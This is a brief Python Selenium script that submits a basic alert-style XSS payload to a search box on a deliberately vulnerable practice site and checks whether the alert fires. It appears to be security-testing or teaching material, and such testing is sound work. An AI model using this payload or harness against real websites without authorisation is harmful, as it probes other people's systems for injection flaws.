from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Step 1: Launch browser
driver = webdriver.Chrome()

# Step 2: Navigate to a vulnerable website or a test environment
driver.get("http://testphp.vulnweb.com/")

# Step 3: Inject XSS payload into a search field
xss_payload = "<script>alert('XSS');</script>"
search_box = driver.find_element(By.NAME, "q")
search_box.send_keys(xss_payload)
search_box.submit()

# Step 4: Check for XSS execution by detecting alert
time.sleep(5)
try:
    alert = driver.switch_to.alert
    alert_text = alert.text
    assert alert_text == "XSS"
    print("XSS vulnerability detected!")
    alert.accept()
except:
    print("No XSS vulnerability detected.")

# Step 5: Close the browser
driver.quit()
